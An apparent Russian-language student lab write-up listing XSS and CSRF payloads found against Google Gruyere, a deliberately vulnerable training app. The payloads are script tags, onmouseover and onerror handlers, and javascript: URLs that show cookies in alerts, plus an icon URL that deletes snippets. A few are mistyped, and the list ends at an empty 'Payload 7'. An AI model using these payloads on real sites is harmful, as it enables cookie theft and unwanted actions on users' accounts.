# Payloads для gruyere

_Пример оформления работы_

## Payload 1

При переходе по ссылке `https://example.com/example`. Параметр `example` можно заменить на пейлоад `<script>alert(document.cookies)</script>` для выполнения Reflected XSS инъекции в элементе `<div id="search-query-param">...</div>`, который покажет куки файлы пользователя

Payload 1
При создании нового сниппета можно написать в нём <a onmouseover="alert(document.cookie) href='#'">text</a>, который будет выводит куки при наведении.

Payload 2
При изменении цвета профиля можно задать цвету атрибуты onmouseover black' onmouseover='alert(682)', который при наведении на него будет выводить alert.

Payload 3
При изменении профиля можно написать url в icon https://google-gruyere.appspot.com/509870841862400053734264954502968465848/deletesnippet?index=0 , который позволяет удалять сниппеты

Payload 4
В приват сниппет можно написать любой html тег например <img src=x onerror=alert('XSS')>, что выведит alert на странице.

Payload 5
В изменении иконки профиля можно вставить html тег img <img%20src="javascript:alert(document.cookie);"></img> - alert вывелся

Payload 6
В изменении профиля можно указать ссылку на home page и туда можно вставить `<img src=x onerror=alert(1)>`

Payload 7

